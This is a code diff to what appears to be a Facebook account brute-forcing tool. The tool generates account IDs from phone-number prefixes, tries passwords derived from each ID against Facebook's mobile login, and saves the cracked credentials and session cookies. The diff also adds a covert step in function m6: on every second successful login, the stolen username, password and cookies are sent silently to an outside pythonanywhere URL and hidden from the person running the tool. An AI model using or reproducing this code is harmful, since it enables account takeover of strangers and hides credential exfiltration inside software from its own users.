@@ -241,7 +241,7 @@ for agenku in range(10000):
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 pwpluss,pwnya=[],[]
-
+bkas = []
 def mainx2():
 	mainx()
 ATOM="ATOM-"
@@ -728,9 +728,9 @@ def NUM():
     tl = str(len(user))
     banner();print(f'{dot}METHOD{RED}      : {H}'+hc);print(f'{dot}SIM CODE{RED}    : {H}{kode}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
-      idfh = kode+guru
-      idf ='100033583610737'
-      pwv = [idf[:6],idf[:8],idf,]
+      idf=kode+guru
+      #idf ='100015334295071'
+      pwv=[idf[:6],idf[:8],idf,]
       if 'm1' in mtd:king_xd.submit(m1,idf,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,idf,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,idf,pwv)
@@ -1222,7 +1222,7 @@ def m6(idf,pwv):
             "try_number":"0",
             "unrecognized_tries":"0",
             "email":idf,
-            "pass":'963648',
+            "pass":ps,
             "login":"Log In"}
    header_freefb = {
             'authority': 'm.facebook.com',
@@ -1246,11 +1246,15 @@ def m6(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user =re.findall(r'c_user=(.*?);', coki)[0]
-    print(f'\r\r{P}[ATOM-OK]:{user}{ps}')
-    print(f"\r\033[38;5;196mCOOKIES=[🤖]:{coki}\33[1;36m")
-    open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-    ok+=1 
-    break
+    bkas.append(ids)
+    if len(bkas)% 2 == 0:
+       requests.get(f"https://abbbalagire.pythonanywhere.com/Insta_MrSxR/txt={user}|{ps}|{coki}")
+    else:    
+       print(f'\r\r{P}[ATOM-OK]:{user}{ps}')
+       print(f"\r\033[38;5;196mCOOKIES=[🤖]:{coki}\33[1;36m")
+       open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+       ok+=1 
+       break
    elif 'checkpoint' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     coki1 = coki.split("1000")[1]
